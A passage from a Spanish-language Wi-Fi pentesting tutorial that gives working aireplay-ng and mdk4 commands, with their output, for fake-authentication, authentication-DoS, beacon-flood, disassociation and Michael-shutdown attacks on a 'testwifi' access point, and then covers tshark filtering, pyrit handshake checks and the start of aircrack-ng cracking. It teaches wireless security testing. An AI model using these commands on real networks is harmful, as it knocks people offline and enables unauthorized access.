21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [15:E7:95:73:D4:90]
```

### Ataque de autenticación

¿Parece un poco raro el nombre del ataque, ¿no? Suena irónico, pero existe este ataque de autenticación o asociación. La idea es, en vez de expulsar a los clientes de un AP, añadirlos.

Bueno, nuestra idea siempre es hacer que los clientes dentro de la red inalámbrica o AP se desconecten, ya sea mediante ataques directos como el ataque de desautenticación o esperando a que se desconecten y luego se vuelvan a conectar. Sin embargo, con este ataque, la idea es añadir muchos clientes al AP, hasta el punto en que el AP se sobrecargue, no pueda soportar la cantidad de conexiones y empiece a expulsar a los clientes asociados a la red.

Este mismo ataque se representa con el número `-1`. Como ya expliqué arriba, la propia herramienta tiene un panel de ayuda, y el número -1 indica el ataque de autenticación falsa (**Fake Auth**).

Retomando el escenario anterior:

```bash
CH  7 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 15:E7:95:73:D4:90  -26 100       29        7    3   7  180  WPA2 CCMP   PSK  testwifi                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 15:E7:95:73:D4:90  34:41:5D:46:D1:38  -26    0e- 6e     0        9  
```

De esta manera es como añadiremos a un cliente con la herramienta aireplay:

```bash
[root@arch ~]# sudo aireplay-ng -1 0 -e testwifi -h 11:22:33:44:55:66 wlan0mon
21:20:28  Waiting for beacon frame (ESSID: testwifi) on channel 7
Found BSSID "15:E7:95:73:D4:90" to given ESSID "testwifi".

21:20:28  Sending Authentication Request (Open System) [ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request (Open System) [ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request (Open System) [ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request [ACK]
21:20:38  Association successful :-) (AID: 1)
```

Con el parámetro `-h` especificamos la dirección MAC del falso cliente a autenticar. Si después de realizar el ataque analizamos el AP, podremos ver que el falso cliente que recién añadimos aparece como cliente en el AP.

```bash
CH  7 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 15:E7:95:73:D4:90  -26 100       29        7    3   7  180  WPA2 CCMP   PSK  testwifi                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
 15:E7:95:73:D4:90  11:22:33:44:55:66  -10    0 - 1      0        10                                                                                                                                                                    
 15:E7:95:73:D4:90  34:41:5D:46:D1:38  -26    0e- 6e     0        9  
```

Ojo, el hecho de que hayamos añadido un cliente al AP no significa que estemos dentro de la red ni que hayamos vulnerado la red. Claro que no. Lo que estamos haciendo es engañar al router, haciéndole creer que el cliente está asociado. Pero algunos podrían pensar: 'Si agregar un cliente no hace nada, ¿verdad?' Pues no exactamente. Un cliente falso asociado al AP no haría nada por sí solo, pero ¿qué pasaría si agregamos 5000 clientes? Ah, ¿verdad? Bueno, para hacer esto utilizaremos otra herramienta llamada **mdk4**.

## Instalación de mdk4

---
Una breve explicación de lo que es esta herramienta llamada mdk4: es una herramienta utilizada mayormente en pruebas de penetración y auditorías de redes inalámbricas, empleando varios tipos de ataques, como por ejemplo el **Authentication DoS mode**, que explicamos más adelante.

---

La instalación es la siguiente:

**Para distros basadas en debian/ubuntu**
```bash
[user@kali ~]$ sudo apt update && sudo apt upgrade -y
[user@kali ~]$ sudo apt install mdk4
```
**Para distros basadas en arch-linux**
```bash
[user@arch ~]$ sudo pacman -Syu
[user@arch ~]$ sudo pacman -S mdk4
```

En breve les voy a enseñar cómo usar esta herramienta. Solo quiero que se queden con el concepto de estos ataques. La idea principal es generar o añadir la mayor cantidad posible de clientes al AP para saturarlo, de modo que el AP comience a desconectar a los clientes y así obtener el **handshake**.

## Tipos de ataques con mdk4
---
Con esta herramienta, aplicaremos una variedad de ataques más complejos que los disponibles en **aireplay**. **MDK4** se utiliza principalmente en auditorías de seguridad de redes, enfocándose en la parte ofensiva, y forma parte de la suite Aircrack-ng. Aunque algunos de estos ataques pueden realizarse con aireplay, **MDK4** es más útil como herramienta de apoyo para llevar a cabo ataques más agresivos y variados.

---
Para ver qué ataques tiene disponibles la herramienta **mdk4**, se usa el comando `mdk4 --help`.


### Authentication DoS mode

Ahora, ¿qué ataque haremos con la herramienta mdk4? Bueno, el nombre de este ataque con **mdk4** es **Authentication DoS mode**. Lo que hace este ataque es añadir muchos clientes falsos muy rápidamente. El parámetro para activar este ataque es el `a` y el parámetro `-a` indica el bssid del AP objetivo.

```bash
[root@arch ~]# mdk4 wlan0mon a -a 15:E7:95:73:D4:90
```

Esto es lo que veremos cuando estemos monitoreando el AP objetivo:

```bash

CH  7 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 15:E7:95:73:D4:90  -26 100       29        7    3   7  180  WPA2 CCMP   PSK  testwifi
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1    
```

¿Sorprendente, no? Y esta lista sigue, es inmensa. Con esto conseguiremos que la red se vuelva lenta y empiece a desconectar a los clientes asociados. Incluso, podría quedar temporalmente inoperativa.

### Beacon flood mode attack

Antes de continuar con el ataque, es importante entender qué es un beacon. Un beacon es un tipo de paquete que contiene información sobre el punto de acceso, como el canal en el que se encuentra, el nombre de la red , entre otros detalles.

```bash
[root@arch ~]# tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null
1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=testwifi
2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=testwifi
3 0.614413670 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=testwifi
4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=testwifi
```

Y ahora bien, ¿qué es esta herramienta llamada **TShark**? Técnicamente, es Wireshark pero en terminal. Sirve para ver el tráfico de la red, más que nada para observar los paquetes que se están transmitiendo en tiempo real. Con esta herramienta se pueden analizar y filtrar por tipo de paquetes, pero esto lo veremos un poco más adelante. Lo importante por ahora es quedarnos con el concepto de este tipo de paquetes, que trae información sobre el **AP objetivo**.

Bueno, para este ataque necesitaremos la herramienta **mdk4**, que en teoría ya deberíamos haber descargado anteriormente, ya que la usamos en otro ataque. En fin, la idea es crear múltiples **APs falsas** en el mismo canal donde se encuentra nuestro AP objetivo, para así dañar el espectro de onda y afectar al AP objetivo. A continuación, te explico cómo lo haremos.

```bash
[root@arch ~]# sudo mdk4 wlan0mon b -a -s 1000 -c 7
```
Ahora analicemos este ataque. Primero, especificamos nuestra interfaz de red, previamente activado el modo monitor. Con la opción `-b` le indicamos el tipo de ataque, que en este caso es el **Beacon Flood Mode Attack**. El `-a` indica que se crearán redes WPA2, y el `-s` establece la velocidad de paquetes a emitir por segundo; por defecto, son 50. Además, por defecto, los nombres de las APs falsas son aleatorios, aunque nosotros podemos especificarlos con la opción `-f`, indicando el archivo donde estarán los nombres de las APs.

Si todo lo hicieron bien, ahora mismo debería estar corriendo el ataque. Ustedes pueden ver cómo se ve este ataque en tiempo real ejecutando `airodump-ng wlan0mon`, o también revisando la sección de conexiones Wi-Fi en su celular.

Algo así se vería:

```bash
CH  7 ][ Elapsed: 24 s ][ 2024-11-08 12:33 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 0B:11:D5:AF:7F:78  -88        2        0    0   7   54   OPN              �.Qr��ZB`                     
 92:BA:C1:CE:8D:4E  -88        2        0    0   7   54   WEP  WEP         �z%�Q���G����W�=-.�u�.�Q�:�
 C6:BA:25:A5:50:CE  -88        2        0    0   7   11   WPA2 CCMP   PSK  ������q].��V��V�GcF��|�k6..��
 0E:1C:0F:5D:83:19  -88        2        0    0   7   11   WPA  TKIP   PSK  �).,��:�RCϻ���l��...�=�Y    
 71:67:61:D4:20:5C  -88        2        0    0   7   11   WPA2 CCMP   PSK  ���˂͡.5�o#.�P�2*o�t...�xo]��
 E9:AC:2C:4E:96:C0  -88        2        0    0   7   11   WEP  WEP         ��.�������.C���rΨ�+Ɲ��I!���
 67:5C:72:4B:6D:1C  -88        2        0    0   7   54   WPA  TKIP   PSK  ˢ��=�����hKk�l=?�1P��.f,����
 E3:B6:D1:EC:FC:B1  -88        2        0    0   7   11   WPA2 CCMP   PSK  j��������.Y�.���X�a���.Jw�.c��
 3B:B5:57:97:71:19  -88        2        0    0   7   11   WPA  TKIP   PSK  �h.����W!0<��إ��Ǚz@�,L.ᣚS�
 86:59:F9:40:24:B4  -88        2        0    0   7   54   WPA  TKIP   PSK  �ڸN�v�.-.�bG?wJR׷��z.WsW|(
 4A:93:62:D5:EA:BC  -88        2        0    0   7   54   WEP  WEP         ��o[=A��9���9�DN�<4.��hu4=_�
 46:FF:76:0A:DE:78  -88        2        0    0   7   11   WPA  TKIP   PSK  �ޞ@�����~n����Q�.�4.̄I��S�r
 64:05:55:D6:D6:4A  -88        2        0    0   7   54   WEP  WEP         ��&�m.�*X�.�����J�y�.?CiE�?.�
 5A:47:69:D7:7E:B3  -88        2        0    0   7   11   WEP  WEP         zG�ԕ������$�'���.5͇.1�_x46��
 9F:39:8E:97:3F:4D  -88        2        0    0   7   54   WPA  TKIP   PSK  ��x�.k�S�..-y                
 50:BF:3C:57:0D:84  -88        2        0    0   7   54   OPN              w9����(.BX�.:$�EE���.�QR����.
 1E:CB:32:1C:89:8A  -88        2        0    0   7   54   WEP  WEP         ��.�ʁ�.����.�-0D�֨7`Zs&���0
 EC:8A:06:7A:A8:F1  -88        2        0    0   7   11   WPA  TKIP   PSK  ��                            
 D5:6F:07:CD:26:8F  -88        2        0    0   7   54   WEP  WEP         I������..J&!�w�]�aR��`Ii6�q.� 
 FF:16:8D:86:59:BE  -88        2        0    0   7   11   WPA2 CCMP   PSK  �׉��N�G�'DN��.���yj7D�CC���.�
 42:10:3F:61:7F:29  -88        2        0    0   7   54   WPA  TKIP   PSK  ��bY��U.)�.b痻������;�i~���1�
 AC:50:9D:0F:FD:C1  -88        2        0    0   7   11   OPN              �m�m�.��&�gf��~2��.9��+A.�P.�
 BF:6E:AE:5D:C6:8C  -88        2        0    0   7   11   WEP  WEP         zZ�.o��N�0y#���)�\�q.(/f�.Dc�
 F7:88:F9:5A:BD:7B  -88        2        0    0   7   11   WPA  TKIP   PSK  h��z.�t�.FB��c���<�b-.�%��t`
 CF:65:B8:1F:AC:69  -88        2        0    0   7   11   WPA2 CCMP   PSK  .M:.)�`tY?�..��x.y�1{��3�B�
```

### Disassociation amok mode attack

Este ataque no difiere significativamente de un ataque de desautenticación simple, salvo que en esta variante utilizaremos una **blacklist** o una **whitelist** con la herramienta **mdk4**.

```bash
[root@arch ~]# sudo mdk4 wlan0mon d -c 7 -B 15:E7:95:73:D4:90 -b blacklist.txt -w whitelist.txt
```
En este comando, primero especificamos la interfaz en modo monitor. El parámetro `-d` indica el tipo de ataque, en este caso **Disassociation amok Mode**. El parámetro `-B` define el BSSID del AP objetivo, y el parámetro `-c` indica el canal. Finalmente, `-b` señala el archivo con las direcciones MAC de los clientes, permitiendo el uso de una **blacklist**.

Ahora, como les indiqué al principio, también se le puede indicar una **whitelist**, esto se hace con el parámetro `-w`, indicando a los clientes que no serán deautenticados, los que no salgan de en esa whitelist serán desconectados.

### Michael shutdown explotation

Con este ataque, podríamos llegar a apagar un router. Aunque, como estás viendo, la posibilidad de apagar un router realmente es baja. En todas las prácticas que he realizado, este ataque no ha sido muy efectivo, y hay poca probabilidad de que logres apagar un router. Sin embargo, es importante conocer este ataque y saber cómo ejecutarlo.

```bash
[root@arch ~]# sudo mdk4 wlan0mon m -B 15:E7:95:73:D4:90
```

Aquí está el comando. No es difícil de interpretarlo. El parámetro `-m` indica el tipo de ataque, ya sabemos cómo funciona. Con `-B` indicamos el BSSID del AP objetivo. Como mencioné antes, hay pocas probabilidades de que este ataque funcione, aunque es útil conocerlo y saber cómo ejecutarlo.

## Técnicas pasivas

Creo que ya es momento de hablar de las técnicas pasivas, ya que la mayoría de las que hemos visto hasta ahora son técnicas activas. Aunque las técnicas pasivas, como su nombre indica, no involucran una intervención directa, hay algunas que pueden ser útiles. Por ejemplo, podemos quedarnos simplemente monitorizando el AP objetivo hasta que un cliente se desconecte y vuelva a conectarse.

Algo que deben saber es que el handshake se genera de la misma manera si el cliente se desconecta porque está muy lejos del AP y se vuelve a conectar, o si nosotros lo desconectamos al interferir con la señal. En ambos casos, el handshake se genera de manera similar. Por lo tanto, no es necesario llamar la atención al realizar estos ataques, ya que nuestro objetivo es capturar el handshake. Sin embargo, es importante verificar que el handshake se haya generado correctamente, lo cual explicaremos más adelante.

## Instalación de Tshark

 Ahora, llego el momento de hablar de está herramienta, la cual es **tshark** esta herramienta nos va a servir para analizar filtrar paquetes transmitidos por el aire, o al momento de hacer alguna captura filtrar por tipo de paquetes y analizar esta captura, y les habia dicho que esta herramienta, es como **wireshark** pero en terminal, wireshark es **tshark** con **gui**, sirve para lo mismo, analizar y filtrar paquetes que se estan transmitiendo en el aire en tiempo real, en nada les enseñare a usar **tshark**.

**Para distros basada en debian/ubuntu**
```bash
[user@kali ~]$ sudo apt update && sudo apt upgrade -y
[user@kali ~]$ sudo apt install tshark
```

**Para distros basadas en arch-linux**
```bash
[user@arch ~]$ sudo pacman -Syu
[user@arch ~]$ sudo pacman -S tshark
```

### Filtración de paquetes con Tshark

La sintaxis es la siguiente:

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "" 2> /dev/null
```

Para usar esta herramienta, se debe indicar un archivo .cap para filtrar por tipo de paquetes, o también se puede usar mientras se está monitoreando un AP objetivo, o simplemente para listar las redes inalámbricas locales con airodump-ng. Con esta herramienta, ya podemos filtrar paquetes. Primero, mostraremos cómo filtrar en un archivo `.cap`.

**PAQUETES EAPOL**

Ahora, cuando capturamos paquetes de un AP objetivo, solemos extraer más de lo necesario. Los paquetes que realmente nos interesan son los **EAPOL**, ya que en ellos se encuentran los handshakes. Así es como se puede filtrar por paquetes **EAPOL**.

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "eapol" 2> /dev/null
 1280  20.228981 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 1303  20.249807 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 1422  20.557237 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 1464  20.601980 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 1611  20.777629 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 1615  20.797905 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 1774  21.120854 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 1893  21.277189 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 1970  21.511711 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 2109  21.668039 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 2168  21.902745 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 6970  44.105291 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 7187  44.427600 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 7210  44.451267 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
 7339  44.607206 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 155 Key (Message 1 of 4)
 7360  44.633641 AtwTechnolog_15:8e:f0 → AmazonTechno_4a:a5:8f EAPOL 189 Key (Message 3 of 4)
```

**PAQUETES BEACON**

Ahora, para filtrar por tipo de paquetes Beacon, se utiliza un filtro específico como este: `wlan.fc.type_subtype == 0x08`.
El campo **wlan.fc.type_subtype** especifica el tipo y subtipo del paquete, y **0x08** es el código hexadecimal para los Beacon frames. También se puede representar con el número **8**, es decir, para los paquetes de tipo **Beacon**.

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==0x08" 2> /dev/null
1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=testwifi
4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=testwifi
```

**PAQUETES PROBE REQUEST**

Este tipo de paquete es enviado por la estación/cliente (es decir, el dispositivo) para escanear las redes disponibles a su alrededor, o cuando desea conectarse a un AP específico, o simplemente está buscando redes en el área local.

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==4" 2> /dev/null
  707 2.693854872 ASUSTekCOMPU_40:65:a9 → Broadcast    802.11 243 Probe Request, SN=3396, FN=0, Flags=........C, SSID="testwifi"
  708 2.695374883 ASUSTekCOMPU_40:65:a9 → Broadcast    802.11 226 Probe Request, SN=3397, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  710 2.752029629 ASUSTekCOMPU_40:65:a9 → Broadcast    802.11 226 Probe Request, SN=3401, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  737 3.123827278 ASUSTekCOMPU_40:65:a9 → Broadcast    802.11 243 Probe Request, SN=3420, FN=0, Flags=........C, SSID="testwifi"
  738 3.125817757 ASUSTekCOMPU_40:65:a9 → Broadcast    802.11 226 Probe Request, SN=3421, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

**PAQUETES PROBE RESPONSE**

Este tipo de paquete es la respuesta al **Probe Request** enviado por el dispositivo. Por ejemplo, cuando un cliente quiere ingresar o simplemente buscar redes disponibles, envía un Probe Request. Si el cliente desea conectarse a un AP, ese AP recibe el Probe Request y emite el Probe Response.

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==5" 2> /dev/null
    2   1.617473 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1872, FN=0, Flags=........, BI=100, SSID=testwifi
    5   1.628735 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1874, FN=0, Flags=........, BI=100, SSID=testwfi
   10   3.698368 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2340, FN=0, Flags=........, BI=100, SSID=testwifi
   12   3.701951 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2341, FN=0, Flags=........, BI=100, SSID=testwifi
   14   3.756735 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2342, FN=0, Flags=........, BI=100, SSID=testwifi
```

**PAQUETES ASSOCIATION REQUEST**

El paquete de tipo Association Request es enviado cuando un cliente o dispositivo quiere ingresar a un AP para asociarse a la red inalámbrica. Este paquete es parte del proceso mediante el cual el cliente solicita unirse a la red.

```bash
[root@arch ~]# tshark -r Captrua-01.cap -Y "wlan.fc.type_subtype==0" 2> /dev/null
 22   5.041479 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 122 Association Request, SN=227, FN=0, Flags=........, SSID=testwifi
```

**PAQUETES ASSOCIATION RESPONSE**

Este paquete es la respuesta, como indica su nombre, al paquete de tipo Association Request cuando un dispositivo se asocia exitosamente a una red inalámbrica.

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==1" 2> /dev/null
21131 406.640245 AtwTechnolog_15:8e:f0 → Broadcast    802.11 97 Association Response, SN=2194, FN=0, Flags=........
21254 409.671851 AtwTechnolog_15:8e:f0 → Broadcast    802.11 97 Association Response, SN=2232, FN=0, Flags=........
```

**PAQUETES AUTHENTICATION**

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==11" 2> /dev/null
21124 406.616373 AtwTechnolog_15:8e:f0 → Broadcast    802.11 30 Authentication, SN=2193, FN=0, Flags=........
21241 409.641098    Broadcast → AtwTechnolog_15:8e:f0 802.11 30 Authentication, SN=582, FN=0, Flags=........
21245 409.648346 AtwTechnolog_15:8e:f0 → Broadcast    802.11 30 Authentication, SN=2231, FN=0, Flags=........
```

**PAQUETES DEAUTHENTICATION**

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==12" 2> /dev/null
 1068  19.983802 AtwTechnolog_15:8e:f0 → Broadcast    802.11 26 Deauthentication, SN=0, FN=0, Flags=........
 1069  19.985028 AtwTechnolog_15:8e:f0 → Broadcast    802.11 26 Deauthentication, SN=0, FN=0, Flags=........
 1070  19.986305 AtwTechnolog_15:8e:f0 → Broadcast    802.11 26 Deauthentication, SN=1, FN=0, Flags=........
```

**PAQUETES DISSASOCIATION**

```bash
[root@arch ~]# tshark -i wlan0mon -Y "wlan.fc.type_subtype==10" 2> /dev/null
    1 0.000000000 AtwTechnolog_15:8e:f0 → AtwTechnolog_15:8e:f0 802.11 39 Disassociate, SN=2800, FN=0, Flags=........
    3 0.000005527 AtwTechnolog_15:8e:f0 → AtwTechnolog_15:8e:f0 802.11 39 Disassociate, SN=2802, FN=0, Flags=........
    5 0.001661396 AtwTechnolog_15:8e:f0 → AtwTechnolog_15:8e:f0 802.11 39 Disassociate, SN=2801, FN=0, Flags=........
```

**PAQUETES CTS (Clear To Send)**

```bash
[root@arch ~]# tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==28" 2> /dev/null
    1   0.000000              → AtwTechnolog_15:8e:f0 802.11 10 Clear-to-send, Flags=........
    3   0.000015              → f2:a7:5e:7a:48:f1 802.11 10 Clear-to-send, Flags=........
    5   0.000022              → AtwTechnolog_15:8e:f0 802.11 10 Clear-to-send, Flags=........
```

## Validación y verificación del Handshake

Bueno, en todo lo que hemos visto hasta ahora en el curso, hemos aprendido cómo generar el handshake, pero no cómo verificarlo. Sin embargo, es posible que hayamos capturado el handshake y que la propia suite de herramientas nos indique que lo hemos hecho, pero aún existe la posibilidad de que no sea haya generado correctamente. Por eso, esta sección es importante. Para verificarlo, necesitaremos una herramienta llamada Pyrit.

### Instalación de pyrit


**Para distros basadas en debian/ubuntu***
```bash
[user@kali ~]$ sudo apt update && sudo apt upgrade -y
[user@kali ~]$ sudo apt install pyrit
```
**Para distros basadas en arch-linux**
```bash
[user@arch ~]$ sudo pacman -Syu
[user@arch ~]$ sudo pacman -S pyrit
```

### Usó de pyrit
Una vez descargada la herramienta Pyrit, la sintaxis es la siguiente: el parámetro -r indica el archivo a analizar, que debe ser un archivo con extensión .cap, y luego se usa el parámetro analyze para proceder con el análisis.

**HANDSHAKE GENERADO CORRECTAMENTE**

```bash
[root@arch ~]# sudo pyrit -r Captura-01.cap analyze
Pyrit 0.5.0 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 8 packets (8 802.11-packets), got 1 AP(s)

#1: AccessPoint 15:E7:95:73:D4:90 ('testwifi'):
  #1: Station a0:a4:c5:4f:4b:a6
  #2: Station 00:bf:af:7b:ba:43
  #3: Station d6:fd:aa:e8:d3:45
  #4: Station 11:22:33:44:55:66, 1 handshake(s):
    #1: HMAC_SHA1_AES, bad, spread 1
```

Ahora, al interpretar el output anterior, vemos que el AP **testwifi** tiene 4 clientes/estaciones, y el cuarto cliente, con la dirección MAC **11:22:33:44:55:66**, generó un handshake. Esto indica que se ha desconectado y se ha vuelto a conectar, lo que generó el handshake.

**HANDSHAKE NO GENERADO CORRECTAMENTE**

```bash
[root@arch ~]# pyrit -r Captura-01.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 2 packets (2 802.11-packets), got 1 AP(s)

#1: AccessPoint 15:E7:95:73:D4:90 ('testwifi'):
No valid EAOPL-handshake + ESSID detected.
```

En este caso, el mismo AP objetivo indica que no ha generado ningún handshake: **No valid EAPOL-handshake - ESSID detected**. Por eso, es importante verificar el archivo `.cap` para asegurarse de que el handshake se haya generado correctamente, ya que existe la posibilidad de que no se haya generado, como en este caso.

## Crackeo de Handshakes

---
Ahora, les he enseñado cómo generar el handshake a través de escenarios pasivos y activos. Incluso vimos cómo verificar si el handshake se generó correctamente o no. Pero ahora llega el momento de crackear este handshake para poder ver la contraseña de la red inalámbrica objetivo.

---

### Crackeo con Aircrack-ng

Llegó la hora de usar esta increíble herramienta. Aunque hemos utilizado la suite de **Aircrack**, no hemos usado directamente **aircrack-ng**. En esta ocasión, usaremos esta herramienta para crackear el **handshake** ejecutando un **ataque de diccionario**

Ahora, continuemos. Ya hemos deautenticado al cliente (o realizado el ataque correspondiente), generando el handshake y verificando que se haya generado correctamente. A continuación, necesitaremos un **diccionario**.

Y qué es este tal diccionario? No es más que un archivo, generalmente `.txt`, que puede contener miles o millones de contraseñas. Con este diccionario, nosotros lo usaremos para crackear el **handshake**. El diccionario más popular para contraseñas comunes es el querido **rockyou.txt.** Para usuarios de Kali Linux, normalmente lo podrán encontrar en esta ruta: `/usr/share/wordlists/rockyou.txt`.

Bueno, ya teniendo el handshake generado correctamente en la captura y verificado, lo siguiente será indicarle a Aircrack la ruta del diccionario de contraseñas y la misma captura, que es el archivo `.cap`.

```bash
